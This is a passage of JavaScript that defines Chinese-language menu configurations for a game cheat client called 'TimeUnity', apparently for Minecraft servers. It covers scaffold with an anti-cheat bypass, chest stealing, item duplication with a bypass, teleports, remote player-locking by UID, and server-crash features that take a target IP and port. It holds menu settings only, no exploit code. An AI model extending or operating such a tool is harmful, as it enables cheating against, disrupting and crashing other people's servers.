                    "off_sound": "TimeUnity/关闭音效.mp3",
                    "checked": false
                },
                {
                    "type": "CheckBox",
                    "key": "AntiVoid_Rebound",
                    "name": "传送回弹",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": true
                },
                {
                    "type": "CheckBox",
                    "key": "AntiVoid_Block",
                    "name": "自动方块",
                    "color": "${menu_item_check_color || "#121212"}",
                    "checked": false
                },
                {
                    "type": "SeekBar",
                    "color": "${main_item_color || "#121212"}",
                    "key": "AntiVoid_Speed",
                    "format": "下落速度%.2f",
                    "min": 0.30,
                    "max": 1.00,
                    "value": 0.80
                }
            ]
        }
    ]
}`
const TU玩家类 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-玩家 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-玩家 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU玩家类",
      "items": [
        {
          "type": "Switch",
          "name": "自动搭路",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/Scaffold.png",
            "on": "TimeUnity_Shortcut/open/Scaffold.png",
            "icon": "TimeUnity_Shortcut/close/Scaffold.png"
          },
          "key": "Scaffold",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("Scaffold")}
        },
        {
          "type": "CheckBox",
          "name": "静默模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_SilentMode",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "锁定Y轴",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_LockY",
          "checked": true,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "自动选取",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_AutoBuild",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "渲染方框",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_RenderBox",
          "checked": true
        },
        {
          "type": "CheckBox",
          "name": "宝马加速",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_BJDSpeed",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "绕过EC",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_BypasEC",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "移动跳跃",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_MoveJump",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "假方块模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Scaffold_FakeBlock",
          "checked": false,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Scaffold_Speed",
          "format": "速度%.2f",
          "min": 0.10,
          "max": 0.50,
          "value": 0.33
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Scaffold_length",
          "format": "长度%d",
          "min": 1,
          "max": 6,
          "value": 2
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Scaffold_Detection_Range",
          "format": "检测范围%d",
          "min": 1,
          "max": 5,
          "value": 1
        },
        {
          "type": "Switch",
          "name": "箱子小偷",
          "color": "${main_item_color || "#121212"}",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/ChestStealer.png",
            "on": "TimeUnity_Shortcut/open/ChestStealer.png",
            "icon": "TimeUnity_Shortcut/close/ChestStealer.png"
          },
          "key": "ChestStealer",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "静默模式",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "ChestStealer_SilentMode",
          "checked": true
        },
        {
          "type": "CheckBox",
          "name": "自动关闭",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "ChestStealer_Automatic",
          "checked": false
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "ChestStealer_Delay",
          "format": "延迟%d",
          "min": 0,
          "max": 10,
          "value": 3
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "ChestStealer_Quantity",
          "format": "每次拿%d组",
          "min": 1,
          "max": 20,
          "value": 1
        },
        {
          "type": "Switch",
          "name": "自动开箱",
          "color": "${main_item_color || "#121212"}",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/AutoBox.png",
            "on": "TimeUnity_Shortcut/open/AutoBox.png",
            "icon": "TimeUnity_Shortcut/close/AutoBox.png"
          },
          "key": "AutoBox",
          "checked": false
        },
        {
          "type": "CheckBox",
          "name": "渲染容器",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AutoBox_RenderShape",
          "checked": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoBox_Range",
          "format": "距离%d",
          "min": 1,
          "max": 7,
          "value": 3
        },
        {
          "type": "Switch",
          "name": "自动挖床",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/AutoDestroyBed.png",
            "on": "TimeUnity_Shortcut/open/AutoDestroyBed.png",
            "icon": "TimeUnity_Shortcut/close/AutoDestroyBed.png"
          },
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "key": "AutoDestroyBed",
          "checked": false
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoDestroyBed_Range",
          "format": "距离%d",
          "min": 1,
          "max": 4,
          "value": 3
        },
        {
          "type": "Switch",
          "name": "快速挖掘",
          "color": "${main_item_color || "#121212"}",
          "key": "SpeedDestroy",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/SpeedDestroy.png",
            "on": "TimeUnity_Shortcut/open/SpeedDestroy.png",
            "icon": "TimeUnity_Shortcut/close/SpeedDestroy.png"
          },
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "SpeedDestroy_Speed",
          "format": "速度%d",
          "min": 1,
          "max": 30,
          "value": 3
        },
        {
          "type": "Switch",
          "name": "铁砧损坏者",
          "color": "${main_item_color || "#121212"}",
          "key": "AnvilDamage",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AnvilDamage_value",
          "format": "损坏%d",
          "min": 0,
          "max": 5,
          "value": 5
        },
        {
          "type": "Switch",
          "name": "变速",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Timer.png",
            "on": "TimeUnity_Shortcut/open/Timer.png",
            "icon": "TimeUnity_Shortcut/close/Timer.png"
          },
          "key": "Timer",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("Timer")}
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Timer_speed",
          "format": "速度%.2f",
          "min": 1.00,
          "max": 100.00,
          "value": 20.00
        },
        {
          "type": "Switch",
          "name": "带人传送",
          "color": "${main_item_color || "#121212"}",
          "key": "BringTP",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "BringTP_Delay",
          "format": "传送延迟%d",
          "min": 1,
          "max": 100,
          "value": 50
        },
        {
          "type": "EditText",
          "name": "传送坐标",
          "color": "${main_item_color || "#121212"}",
          "key": "BringTP_Pos",
          "hint": "0 0 0",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "大陀螺",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/MegaTop.png",
            "on": "TimeUnity_Shortcut/open/MegaTop.png",
            "icon": "TimeUnity_Shortcut/close/MegaTop.png"
          },
          "key": "MegaTop",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "name": "旋转速度",
          "color": "${main_item_color || "#121212"}",
          "key": "MegaTop_Speed",
          "format": "旋转速度%d",
          "min": 1,
          "max": 45,
          "value": 20
        },
        {
          "type": "Switch",
          "name": "自动破坏",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/AutoBreak.png",
            "on": "TimeUnity_Shortcut/open/AutoBreak.png",
            "icon": "TimeUnity_Shortcut/close/AutoBreak.png"
          },
          "key": "AutoBreak",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("AutoBreak")}
        },
        {
          "type": "SeekBar",
          "name": "破坏范围",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoBreak_Range",
          "format": "破坏范围%d",
          "min": 1,
          "max": 5,
          "value": 3
        },
        {
          "type": "SeekBar",
          "name": "破坏间隔",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoBreak_Interval",
          "format": "破坏间隔%d",
          "min": 0,
          "max": 10,
          "value": 0
        },
        {
          "type": "Switch",
          "name": "残血传送",
          "color": "${main_item_color || "#121212"}",
          "key": "LowTP",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "传送坐标",
          "color": "${main_item_color || "#121212"}",
          "key": "BloodTP_Pos",
          "hint": "0 0 0",
          "max_lines": 6
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "BloodWarp",
          "format": "残血阀值:%d颗星",
          "min": 1,
          "max": 20,
          "value": 5
        },
        {
          "type": "Switch",
          "name": "自动金苹果",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoGapple",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoGapple_Health",
          "format": "食用阀值:%d颗星",
          "min": 1,
          "max": 20,
          "value": 10
        },
        {
          "type": "Switch",
          "name": "自动蘑菇煲",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoFood",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoFood_Health",
          "format": "食用阀值:%d颗星",
          "min": 1,
          "max": 20,
          "value": 12
        },
        {
          "type": "Switch",
          "name": "自动工具",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoTool",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/AutoTool.png",
            "on": "TimeUnity_Shortcut/open/AutoTool.png",
            "icon": "TimeUnity_Shortcut/close/AutoTool.png"
          },
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "锁定夜视",
          "color": "${main_item_color || "#121212"}",
          "key": "LockNight",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "瞬移",
          "color": "${main_item_color || "#121212"}",
          "key": "Blink",
          "checked": false,
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/Blink.png",
            "on": "TimeUnity_Shortcut/open/Blink.png",
            "icon": "TimeUnity_Shortcut/close/Blink.png"
          },
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Blink_Speed",
          "format": "速度%.2f",
          "min": 20.0,
          "max": 100.0,
          "value": 50.0
        },
        {
          "type": "Switch",
          "name": "原地复活",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/NoGrave.png",
            "on": "TimeUnity_Shortcut/open/NoGrave.png",
            "icon": "TimeUnity_Shortcut/close/NoGrave.png"
          },
          "key": "NoGrave",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "反隐身",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiInvis",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "移除掉落物",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiLoot",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "反狐狸",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiFox",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "发包挖掘",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/PacketDestroy.png",
            "on": "TimeUnity_Shortcut/open/PacketDestroy.png",
            "icon": "TimeUnity_Shortcut/close/PacketDestroy.png"
          },
          "key": "PacketDestroy",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "PacketDestroy_Number",
          "format": "发包数量%d",
          "min": 1,
          "max": 500,
          "value": 20
        },
        {
          "type": "Switch",
          "name": "自动拾取",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/AutoLoot.png",
            "on": "TimeUnity_Shortcut/open/AutoLoot.png",
            "icon": "TimeUnity_Shortcut/close/AutoLoot.png"
          },
          "key": "AutoLoot",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "掉落物",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AutoLoot_item",
          "checked": true
        },
        {
          "type": "CheckBox",
          "name": "经验球",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "AutoLoot_xp_orb",
          "checked": false
        },
        {
          "type": "Switch",
          "name": "自动丢物",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/AutoDrop.png",
            "on": "TimeUnity_Shortcut/open/AutoDrop.png",
            "icon": "TimeUnity_Shortcut/close/AutoDrop.png"
          },
          "key": "AutoDrop",
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "checked": false,
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "受伤显示",
          "color": "${main_item_color || "#121212"}",
          "key": "DamageHUD",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "Switch",
          "name": "丢弃物品",
          "color": "${main_item_color || "#121212"}",
          "key": "DropCarriedItem",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "Switch",
          "name": "布吉岛副手",
          "color": "${main_item_color || "#121212"}",
          "key": "BJD_Deputy",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "Switch",
          "name": "反传送",
          "color": "${main_item_color || "#121212"}",
          "key": "AntiTP",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "TextView",
          "name": "宠名修改",
          "color": "${main_item_color || "#121212"}",
          "key": "ModPetName"
        },
        {
          "type": "EditText",
          "name": "宠物名称",
          "color": "${main_item_color || "#121212"}",
          "key": "ModPetData",
          "hint": "目前仅支持修改宠物狐狸",
          "max_lines": 6
        },
        {
          "type": "TextView",
          "name": "查询结构",
          "color": "${main_item_color || "#121212"}",
          "key": "CheckStructure"
        },
        {
          "type": "TextView",
          "name": "召唤坐骑",
          "color": "${main_item_color || "#121212"}",
          "key": "Summon"
        }
      ]
    }
  ]
}`
const TU辅助类 = `{
  "type": "Menu",
  "title": {
    "name": "『 TU-辅助 』",
    "size": 16,
    "elevation": 3,
    "background": "${main_title_background || "#FFFFFF"}",
    "padding": [4, 2, 4, 2],
    "text_margins": [3, 2, 3, 2],
    "colors": ${JSON.stringify(main_title_colors || ["#FF0000", "#000F0F"])}
  },
  "color": "${main_color || "#FFFFFF"}",
  "alpha": ${main_alpha || 0.85},
  "radius": ${main_radius || 8},
  "can_close": true,
  "hide_fun": true,
  "hide": true,
  "items": [
    {
      "type": "TextView",
      "name": "『 TU-辅助 』",
      "color": "${main_item_color || "#121212"}",
      "tag": "TU辅助类",
      "items": [
        {
            "type": "Switch",
            "key": "TransferPlayers",
            "name": "玩家定位",
            "color": "${main_item_color || "#121212"}"
        },
        {
            "type": "CheckBox",
            "key": "TransferPlayersSwitch",
            "name": "传送至玩家",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "TransferTips",
            "name": "传送提示",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "CycleTP",
            "name": "循环传送",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": false
        },
        {
            "type": "CheckBox",
            "key": "OutputPosSwitch",
            "name": "输出坐标信息",
            "color": "${menu_item_check_color || "#121212"}"
        },
        {
            "type": "CheckBox",
            "key": "SavePosSwitch",
            "name": "保存坐标信息",
            "color": "${menu_item_check_color || "#121212"}"
        },
        {
            "type": "CheckBox",
            "key": "TransferOffsetSwitch",
            "name": "传送至目标偏移",
            "color": "${menu_item_check_color || "#121212"}"
        },
        {
           "type": "SeekBar",
            "key": "XTransferOffset",
            "format": "偏移X:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 0,
            "min": -200,
            "max": 200
        },
        {
           "type": "SeekBar",
            "key": "YTransferOffset",
            "format": "偏移Y:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 0,
            "min": -200,
            "max": 200
        },
        {
           "type": "SeekBar",
            "key": "ZTransferOffset",
            "format": "偏移Z:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 0,
            "min": -200,
            "max": 200
        },
        {
          "type": "Switch",
          "name": "复制物品[和谐]",
          "color": "${main_item_color || "#121212"}",
          "key": "Replication",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "off": "TimeUnity_Shortcut/close/Replication.png",
            "on": "TimeUnity_Shortcut/open/Replication.png",
            "icon": "TimeUnity_Shortcut/close/Replication.png"
          },
          "checked": false,
          "enabled": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "CheckBox",
          "name": "自动丢弃",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Replication_Drop",
          "checked": false,
          "enabled": true
        },
        {
          "type": "CheckBox",
          "name": "绕防复制",
          "color": "${menu_item_check_color || "#121212"}",
          "key": "Replication_Bypas",
          "checked": false,
          "enabled": true
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Replication_Delay",
          "format": "延迟%d",
          "min": 0,
          "max": 10,
          "value": 3
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Replication_Count",
          "format": "丢弃数量%d",
          "min": 1,
          "max": 64,
          "value": 64
        },
        {
          "type": "Switch",
          "name": "崩溃器",
          "color": "${main_item_color || "#121212"}",
          "key": "Crasher",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "Crasher_Delay",
          "format": "延迟%d",
          "min": 1,
          "max": 100,
          "value": 50
        },
        {
          "type": "Switch",
          "name": "卡人光环",
          "color": "${main_item_color || "#121212"}",
          "key": "CampersAura",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "SeekBar",
          "color": "${main_item_color || "#121212"}",
          "key": "CampersAura_Speed",
          "format": "发包速度%d",
          "min": 1,
          "max": 170,
          "value": 170
        },
        {
          "type": "Switch",
          "name": "远程卡人",
          "color": "${main_item_color || "#121212"}",
          "key": "LobbyLockPlayer",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "EditText",
          "name": "UID",
          "color": "${main_item_color || "#121212"}",
          "key": "LobbyLockPlayer_UID",
          "hint": "123456",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "自定义名称",
          "color": "${main_item_color || "#121212"}",
          "key": "CustomName",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3"
        },
        {
          "type": "EditText",
          "name": "名称",
          "color": "${main_item_color || "#121212"}",
          "key": "CustomName_Content",
          "max_lines": 6
        },
        {
          "type": "Switch",
          "name": "传送挖矿",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/TeleMine.png",
            "on": "TimeUnity_Shortcut/open/TeleMine.png",
            "icon": "TimeUnity_Shortcut/close/TeleMine.png"
          },
          "key": "TeleMine",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": false
        },
        {
           "type": "SeekBar",
            "key": "TeleMine_Speed",
            "format": "扫描速度:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 20,
            "min": 1,
            "max": 100
        },
        {
          "type": "SeekBar",
          "key": "TeleMine_Range",
          "format": "寻矿范围:%d",
          "color": "${main_item_color || "#121212"}",
          "value": 20,
          "min": 5,
          "max": 30
        },
        {
          "type": "CheckBox",
          "key": "coal_ore",
          "name": "煤矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "iron_ore",
          "name": "铁矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "copper_ore",
          "name": "铜矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "gold_ore",
          "name": "金矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "redstone_ore",
          "name": "红石矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "emerald_ore",
          "name": "绿宝石矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "lapis_ore",
          "name": "青金石矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "diamond_ore",
          "name": "钻石矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "nether_quartz_ore",
          "name": "下界石英矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "nether_gold_ore",
          "name": "下界金矿石",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "CheckBox",
          "key": "ancient_debris",
          "name": "远古残骸",
          "color": "${menu_item_check_color || "#121212"}",
          "checked": false
        },
        {
          "type": "Switch",
          "name": "背包整理",
          "color": "${main_item_color || "#121212"}",
          "shortcut": {
            "type": "CheckedButton",
            "params": [60, 50],
            "no_circle": true,
            "off": "TimeUnity_Shortcut/close/invManager.png",
            "on": "TimeUnity_Shortcut/open/invManager.png",
            "on_sound": "TimeUnity/开启音效.mp3",
            "off_sound": "TimeUnity/关闭音效.mp3",
            "icon": "TimeUnity_Shortcut/close/invManager.png"
          },
          "key": "invManager",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": ${Ftion.exist("invManager")}
        },
        {
            "type": "CheckBox",
            "key": "AutoArmor",
            "name": "自动穿装",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "Drop_Items",
            "name": "丢弃物品",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "Drop_Bow",
            "name": "丢弃弓弩",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "Move_Weapon",
            "name": "移动武器",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "invManager_Silence",
            "name": "静默模式",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "invManager_Automatic",
            "name": "自动关闭",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": true
        },
        {
            "type": "CheckBox",
            "key": "invManager_inventory",
            "name": "仅打开背包",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": false
        },
        {
            "type": "CheckBox",
            "key": "invManager_chest",
            "name": "仅打开箱子",
            "color": "${menu_item_check_color || "#121212"}",
            "checked": false
        },
        {
           "type": "SeekBar",
            "key": "invManager_Delay",
            "format": "延迟:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 3,
            "min": 1,
            "max": 20
        },
        {
           "type": "SeekBar",
            "key": "invManager_SlotQuantity",
            "format": "每次操作:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 1,
            "min": 1,
            "max": 20
        },
        {
           "type": "SeekBar",
            "key": "invManager_DropQuantity",
            "format": "每次丢弃:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 1,
            "min": 1,
            "max": 5
        },
        {
          "type": "Switch",
          "name": "自动重连",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoRC",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "IP端口",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoRC_Text",
          "hint": "127.0.0.1:10086",
          "max_lines": 6
        },
        {
           "type": "SeekBar",
            "key": "AutoRC_IP_Time",
            "format": "二次重连时间:%d",
            "color": "${main_item_color || "#121212"}",
            "value": 20000,
            "min": 10000,
            "max": 50000
        },
        {
          "type": "Switch",
          "name": "自动崩服",
          "color": "${main_item_color || "#121212"}",
          "key": "AutoCrasher",
          "checked": false,
          "on_sound": "TimeUnity/开启音效.mp3",
          "off_sound": "TimeUnity/关闭音效.mp3",
          "enabled": true
        },
        {
          "type": "EditText",
          "name": "IP端口",
          "color": "${main_item_color || "#121212"}",
